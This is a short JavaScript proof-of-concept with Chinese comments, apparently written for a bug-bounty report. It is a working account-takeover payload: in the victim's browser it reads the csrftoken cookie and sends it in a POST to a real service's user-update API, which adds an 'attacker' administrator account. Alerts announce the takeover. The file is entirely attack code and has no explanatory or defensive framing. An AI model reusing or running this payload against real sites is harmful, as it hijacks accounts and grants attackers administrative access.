// 读取指定名称的 Cookie 值
function getCookieValue(name) {
    const cookies = document.cookie.split('; ');
    for (let i = 0; i < cookies.length; i++) {
        const cookie = cookies[i].split('=');
        if (cookie[0] === name) {
            return decodeURIComponent(cookie[1]);
        }
    }
    return null;
}

// 获取 csrftoken
const csrfToken = getCookieValue('csrftoken');

if (csrfToken) {
    alert("Prepare to takeover your account!");
    document.cookie = '_TEA_VE_APIHOST=1; path=/;';
    console.log('[+] 已获取 csrftoken:', csrfToken);
    
    // 发送 POST 请求
    fetch('https://www.pangleglobal.com/media/api/user/update', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'X-Csrf-Token': csrfToken
        },
        body: JSON.stringify({
            "name": "attacker",
            "email": "johnstone+takeoveru@wearehackerone.com",
            "role_info_list": [
                {"type": 2}
            ],
            "operator_type": 1
        })
    })
    .then(function(response) {
        console.log('[+] 响应状态码:', response.status);
        return response.json();
    })
    .then(function(data) {
        console.log('[+] 响应数据:', data);
        alert("Invited administrator account by attacker!");
    })
    .catch(function(error) {
        console.error('[-] 请求失败:', error);
    });
} else {
    console.error('[-] 未找到 csrftoken cookie');
}
